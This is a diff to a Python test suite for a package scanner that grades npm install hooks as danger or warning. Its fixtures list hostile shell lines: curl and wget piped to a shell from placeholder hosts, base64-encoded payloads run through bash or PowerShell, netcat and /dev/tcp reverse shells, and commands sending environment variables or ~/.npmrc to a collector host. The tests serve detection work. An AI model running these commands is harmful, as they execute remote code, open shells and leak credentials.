@@ -19,6 +19,7 @@ shipped copy could diverge without any test noticing.
 """
 
 import re
+import time
 from pathlib import Path
 
 import pytest
@@ -30,11 +31,16 @@ from sandbox_check import (
     CONTEXT_DESCRIPTIONS,
     ENCODED_RUN_LENGTH,
     EXPECTED_INSTALL_DIRS,
+    HOOK_BODY_SCAN_LIMIT,
+    INSTALL_SCRIPT_DANGER_PATTERNS,
     INSTALL_SCRIPT_HOOKS,
+    INSTALL_SCRIPT_PATTERN_TABLE,
+    INSTALL_SCRIPT_WARNING_PATTERNS,
     MALWARE_PATTERN_TABLE,
     MALWARE_PATTERNS,
     NETWORK_EXEC_WINDOW,
     NEXT_STEP_TYPES,
+    HookSeverity,
     SandboxFindings,
     Verdict,
     analyze_install_scripts,
@@ -240,12 +246,12 @@ def test_install_script_danger_is_detected():
 
     assert report.hooks == ["postinstall"]
     assert report.dangers
-    assert any("Downloads external content" in d for d in report.dangers)
+    assert any("piped to a shell" in d for d in report.dangers)
     assert all("postinstall" in d for d in report.dangers)
 
 
 def test_install_script_analysis_covers_every_lifecycle_hook():
-    scripts = {hook: "eval(x)" for hook in INSTALL_SCRIPT_HOOKS}
+    scripts = {hook: "curl https://e.tld/x | sh" for hook in INSTALL_SCRIPT_HOOKS}
     report = analyze_install_scripts(scripts)
 
     assert report.hooks == list(INSTALL_SCRIPT_HOOKS)
@@ -258,6 +264,7 @@ def test_benign_package_has_no_install_script_dangers():
     assert report.hooks == []
     assert report.has_hooks is False
     assert report.dangers == []
+    assert report.warnings == []
 
 
 def test_declared_but_harmless_install_hook_is_reported_without_danger():
@@ -265,6 +272,7 @@ def test_declared_but_harmless_install_hook_is_reported_without_danger():
 
     assert report.hooks == ["postinstall"]
     assert report.dangers == []
+    assert report.has_findings is False
 
 
 @pytest.mark.parametrize("scripts", [None, "not-a-mapping", 42, []])
@@ -274,12 +282,330 @@ def test_install_script_analysis_tolerates_odd_metadata(scripts):
 
     assert report.hooks == []
     assert report.dangers == []
+    assert report.warnings == []
 
 
 def test_install_script_analysis_tolerates_a_non_string_body():
     report = analyze_install_scripts({"postinstall": ["curl", "evil.tld"]})
 
     assert report.hooks == ["postinstall"]
+
+
+# ---------------------------------------------------------------------------
+# Install-hook severity tiers (F37)
+#
+# The table used to be flat: every substring hit was a full DANGER, so a hook
+# that echoed a documentation URL scored exactly like one that piped curl to
+# sh. F36 raised the cost of that, because a git-sourced package's `prepare`
+# genuinely runs and the canonical `prepare` body is a *build* step.
+# ---------------------------------------------------------------------------
+
+
+#: Real attacks. Every one must stay a DANGER — the tiering is a demotion of
+#: capabilities, never of a complete attack.
+DANGEROUS_HOOK_BODIES = [
+    ("curl http://evil.tld/x.sh | /bin/sh", "piped to a shell"),
+    ("curl -sL https://evil.tld/a.sh | bash", "piped to a shell"),
+    ("wget -qO- https://e.tld/x | sh", "piped to a shell"),
+    ("wget https://e.tld/x -O- | sudo /bin/bash", "piped to a shell"),
+    (
+        "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://e.tld/a')\"",
+        "piped to a shell",
+    ),
+    (
+        'powershell -Command "Invoke-WebRequest https://e.tld/a.ps1 -OutFile a; iex a"',
+        "piped to a shell",
+    ),
+    ("curl -s https://e.tld/p -o /tmp/p; chmod +x /tmp/p; /tmp/p", "downloaded file executed"),
+    ("wget https://e.tld/p -O p && ./p", "downloaded file executed"),
+    ("curl -o s.sh https://e.tld/s && sh s.sh", "downloaded file executed"),
+    ("curl https://e.tld/x > f.sh && bash f.sh", "downloaded file executed"),
+    ("echo ZXZpbA== | base64 -d | bash", "encoded payload executed"),
+    ("base64 --decode payload.b64 | sh", "encoded payload executed"),
+    (
+        "node -e \"eval(Buffer.from(process.argv[1],'base64').toString())\"",
+        "encoded payload executed",
+    ),
+    ("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "encoded payload executed"),
+    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "reverse shell"),
+    ("nc -e /bin/sh 10.0.0.1 4444", "reverse shell"),
+    ("ncat --exec /bin/bash 10.0.0.1 4444", "reverse shell"),
+    ("socat TCP:10.0.0.1:4444 EXEC:/bin/sh", "reverse shell"),
+    ('curl -X POST -d "$(env | base64)" https://collector.tld/x', "local data sent"),
+    ("curl --data @- https://c.tld/x <<< $(cat ~/.npmrc)", "local data sent"),
+]
+
+#: Real published install hooks, or shapes indistinguishable from them. None
+#: may reach DANGER: each is a package building itself.
+BENIGN_HOOK_BODIES = [
+    "node-gyp rebuild",
+    "prebuild-install || node-gyp rebuild",
+    "node ./scripts/install.js --fallback-to-build",
+    "node install.js || nodejs install.js",
+    "patch-package && node scripts/copy.js",
+    "make && make install",
+    "opencollective-postinstall || exit 0",
+    "npm run sync && node ./post.js",
+    # F34's own measured example, and F36's inversion case: deleting your own
+    # build output before rebuilding it is not an attack.
+    "rm -rf dist && npm run build",
+    # The single true positive F34 produced over 44,980 packages, reported as
+    # "External URL (https://)" — the weakest row in the flat table.
+    "git clone --depth 1 https://github.com/facebookresearch/faiss.git && cd faiss "
+    "&& cmake -B build .",
+    'echo "Docs: https://github.com/x/y"',
+    "node -e \"console.log(process.env.npm_config_x)\"",
+    "cross-env NODE_ENV=production webpack --config webpack.config.js",
+    "husky install",
+    "tsc -p tsconfig.build.json",
+    # `phenomenon`'s real `prepare`. The flat table called it "Command
+    # execution" because `exec` is a substring of `npm_execpath`.
+    "$npm_execpath run test",
+    # `faiss-node`'s real `install`, the single true positive F34 produced over
+    # 44,980 packages — reported as "External URL (https://)".
+    "prebuild-install --runtime napi --verbose || (git clone -b v1.7.4 --depth 1 "
+    "https://github.com/facebookresearch/faiss.git deps/faiss && npm i cmake-js "
+    "&& npm run build)",
+    "rm -rf lib && tsc",
+    "rm -rf dist && npm run compile && node ./scripts/fixup.cjs",
+    # A hook may legitimately download and then run something *else*. Requiring
+    # any `./x` after a downloader to be an attack reads all four of these as
+    # one; the danger row back-references the downloaded filename instead.
+    "curl -o deps.tgz https://cdn.example.com/deps.tgz && ./scripts/unpack.sh",
+    "curl -fsSL https://get.example.com/v.json -o version.json && node build.js",
+    "wget -q https://x/y.tar.gz -O deps.tgz && tar xzf deps.tgz && make",
+    "curl -L https://x/a.zip --output a.zip && unzip a.zip && ./configure && make",
+]
+
+
+@pytest.mark.parametrize("body,expected", DANGEROUS_HOOK_BODIES)
+def test_a_complete_attack_in_a_hook_is_still_a_danger(body, expected):
+    report = analyze_install_scripts({"postinstall": body})
+
+    assert report.dangers, f"demoted a real attack: {body!r}"
+    assert any(expected in danger for danger in report.dangers)
+
+
+@pytest.mark.parametrize("body", BENIGN_HOOK_BODIES)
+def test_a_build_hook_never_reaches_danger(body):
+    """The flat table called several of these DO NOT INSTALL."""
+    report = analyze_install_scripts({"prepare": body})
+
+    assert report.dangers == [], f"false danger on a build hook: {body!r}"
+
+
+@pytest.mark.parametrize("body", BENIGN_HOOK_BODIES)
+def test_a_benign_hook_still_reaches_the_verdict_as_at_most_a_warning(body):
+    """Demoting the tier must not change the verdict path for a clean package."""
+    findings = SandboxFindings()
+    report = analyze_install_scripts({"prepare": body})
+    findings.extend(dangers=report.dangers, warnings=report.warnings)
+
+    assert findings.verdict is Verdict.SAFE
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "rm -rf dist && npm run build",
+        'echo "Docs: https://github.com/x/y"',
+        "node -e \"require('child_process').execSync('echo hi')\"",
+    ],
+)
+def test_a_demoted_pattern_is_still_reported_as_a_warning(body):
+    """Tiering re-ranks; it never silences. The line still ships, one tier down."""
+    report = analyze_install_scripts({"prepare": body})
+
+    assert report.dangers == []
+    assert report.warnings
+    assert report.has_findings is True
+    assert all(line.startswith("⚠️") for line in report.warnings)
+
+
+def test_every_flat_table_substring_still_produces_a_line():
+    """No coverage was dropped on the way to two tiers.
+
+    The flat table's twenty substrings are the free product's install-hook
+    detection surface; F37 re-ranks them and must not remove one. Each is
+    embedded in a hook body here and has to come back at *some* severity.
+    """
+    substrings = [
+        "curl",
+        "wget",
+        "eval",
+        "exec",
+        "child_process",
+        "rm -rf",
+        "base64",
+        "/dev/tcp",
+        "powershell",
+        "cmd.exe",
+        ".bat",
+        "nc ",
+        "netcat",
+        "/bin/sh",
+        "/bin/bash",
+        "socket",
+        "XMLHttpRequest",
+        "fetch(",
+        "https://",
+        "http://",
+    ]
+
+    for substring in substrings:
+        report = analyze_install_scripts({"postinstall": f"node run {substring} thing"})
+        assert report.has_findings, f"dropped coverage for {substring!r}"
+
+
+@pytest.mark.parametrize(
+    "body,gone",
+    [
+        # "nc " matched the tail of `sync`, so a package running its own sync
+        # step was reported as a netcat reverse shell.
+        ("npm run sync && node post.js", "Netcat"),
+        # ".bat" matched ".batch".
+        ("node ./scripts/run.batch.js", "Batch script"),
+        # "eval" matched "retrieval", "curl" matched "curly", "wget" "widget".
+        ("node ./scripts/retrieval-index.js", "Dynamic code execution"),
+        ("node ./build/curly-braces.js", "Downloads external content"),
+        ("node ./build/widget-bundle.js", "Downloads external content"),
+    ],
+)
+def test_a_substring_that_matched_across_a_word_boundary_no_longer_fires(body, gone):
+    report = analyze_install_scripts({"postinstall": body})
+
+    assert not any(gone in line for line in report.dangers + report.warnings), (
+        f"{body!r} still matches {gone}"
+    )
+
+
+@pytest.mark.parametrize("body", ["rm -fr build", "rm -r ./dist", "rm -rf dist"])
+def test_the_destructive_pattern_no_longer_misses_its_own_flag_spellings(body):
+    """`rm -rf` as a literal substring saw neither `rm -fr` nor `rm -r`."""
+    report = analyze_install_scripts({"prepare": body})
+
+    assert any("Destructive file operation" in line for line in report.warnings)
+
+
+def test_a_finding_line_quotes_the_hook_text_that_matched():
+    """The evidence is the fragment in *this* hook, not the rule that fired."""
+    report = analyze_install_scripts({"postinstall": "curl https://e.tld/a.sh | bash"})
+
+    assert "curl https://e.tld/a.sh | bash" in report.dangers[0]
+
+
+def test_a_pure_lookahead_pattern_still_names_its_evidence():
+    """The exfil row is three lookaheads, so its own match text is empty.
+
+    A finding whose evidence line reads ``(…)`` is not a finding, so the head
+    of the hook body stands in.
+    """
+    body = 'curl -X POST -d "$(cat ~/.npmrc)" https://c.tld/x'
+    report = analyze_install_scripts({"postinstall": body})
+
+    line = next(d for d in report.dangers if "local data sent" in d)
+    assert "()" not in line
+    assert "curl -X POST" in line.split("(", 1)[1]
+
+
+def test_the_snippet_is_bounded():
+    report = analyze_install_scripts({"postinstall": "curl " + "a" * 500 + " | sh"})
+
+    assert all(len(line) < 200 for line in report.dangers + report.warnings)
+
+
+# --- the body-length bound -------------------------------------------------
+#
+# The table is regexes now, and a regex with a bounded window is retried at
+# every start position — so the cost is quadratic in a body whose length the
+# *package* chooses. Measured before the bound: a 43 KB hook body took 38
+# seconds, which is a denial of service against the scanner, not a scan.
+
+
+def test_a_hostile_hook_body_cannot_stall_the_scanner():
+    """Every pattern, against inputs shaped to make each one backtrack."""
+    hostile = [
+        "curl " + "a" * 200_000,
+        "curl " + ("x && " * 40_000),
+        "curl " + ("-o f " * 50_000),
+        "base64 -d " + "a" * 200_000,
+        ("powershell -enc " + "A" * 200) * 2_000,
+        "curl " + ("|" * 200_000),
+        "nc " + ("-e " * 50_000),
+        "curl -d $(x) " * 50_000,
+        "curl -d $(x) y\n" * 20_000,
+    ]
+
+    start = time.perf_counter()
+    for body in hostile:
+        analyze_install_scripts({"postinstall": body})
+    elapsed = time.perf_counter() - start
+
+    # Generous: the measured total is a few milliseconds. The unbounded table
+    # took over a minute for the same list at a tenth of these sizes.
+    assert elapsed < 5.0, f"install-hook table stalled: {elapsed:.1f}s"
+
+
+def test_an_oversized_hook_body_is_read_in_part_and_says_so():
+    body = "echo hi && " + "a" * (HOOK_BODY_SCAN_LIMIT * 2)
+    report = analyze_install_scripts({"postinstall": body})
+
+    assert report.truncated_hooks == ["postinstall"]
+    assert any(str(HOOK_BODY_SCAN_LIMIT) in w for w in report.warnings)
+    assert any("only the first" in w for w in report.warnings)
+    # The body itself is still carried in full for display.
+    assert report.bodies["postinstall"] == body
+
+
+def test_an_oversized_hook_body_makes_the_phase_blind_not_safe():
+    """"Nothing in the first 4,000 characters" is not a pass (the F29 rule)."""
+    findings = SandboxFindings()
+    report = analyze_install_scripts({"postinstall": "a" * (HOOK_BODY_SCAN_LIMIT + 1)})
+    findings.extend(dangers=report.dangers, warnings=report.warnings)
+    if report.truncated_hooks:
+        findings.mark_blind("Install-script analysis", "body was not read in full")
+
+    assert findings.verdict is Verdict.INCONCLUSIVE
+    assert "APPEARS SAFE" not in build_verdict_summary(findings.verdict, "pkg").body
+
+
+def test_the_scan_limit_clears_every_real_install_hook():
+    """532 characters is the longest hook body in the measured corpus."""
+    assert HOOK_BODY_SCAN_LIMIT >= 532 * 5
+
+
+@pytest.mark.parametrize("body", [b for b, _ in DANGEROUS_HOOK_BODIES])
+def test_an_attack_hidden_behind_padding_is_still_caught(body):
+    """Truncation must not become a way to hide the payload behind filler."""
+    padded = "echo start && " + body
+
+    assert analyze_install_scripts({"postinstall": padded}).dangers
+
+
+def test_the_two_tier_views_partition_the_table():
+    assert set(INSTALL_SCRIPT_DANGER_PATTERNS).isdisjoint(INSTALL_SCRIPT_WARNING_PATTERNS)
+    assert len(INSTALL_SCRIPT_DANGER_PATTERNS) + len(INSTALL_SCRIPT_WARNING_PATTERNS) == len(
+        INSTALL_SCRIPT_PATTERN_TABLE
+    )
+    assert INSTALL_SCRIPT_DANGER_PATTERNS, "the danger tier must not be empty"
+
+
+def test_every_install_hook_pattern_compiles_and_is_described_once():
+    seen = set()
+    for entry in INSTALL_SCRIPT_PATTERN_TABLE:
+        re.compile(entry.regex)
+        assert entry.severity in (HookSeverity.DANGER, HookSeverity.WARNING)
+        key = (entry.regex, entry.description)
+        assert key not in seen, f"duplicate row: {key}"
+        seen.add(key)
+
+
+def test_the_danger_tier_leads_the_table():
+    """A report shows the strongest thing it found first."""
+    severities = [entry.severity for entry in INSTALL_SCRIPT_PATTERN_TABLE]
+    first_warning = severities.index(HookSeverity.WARNING)
+
+    assert HookSeverity.DANGER not in severities[first_warning:]
 
 
 # ---------------------------------------------------------------------------
@@ -1184,6 +1510,10 @@ def test_malware_pattern_table_is_defined_once():
         "Netcat - reverse shell",
         "eval() - dynamic code execution",
         "Function constructor - dynamic code",
+        # The F37 danger tier. A copy in the CLI would re-flatten the table
+        # there while every test here stayed green.
+        "downloaded content piped to a shell",
+        "encoded payload executed",
     ]
 
     for sentinel in sentinels:
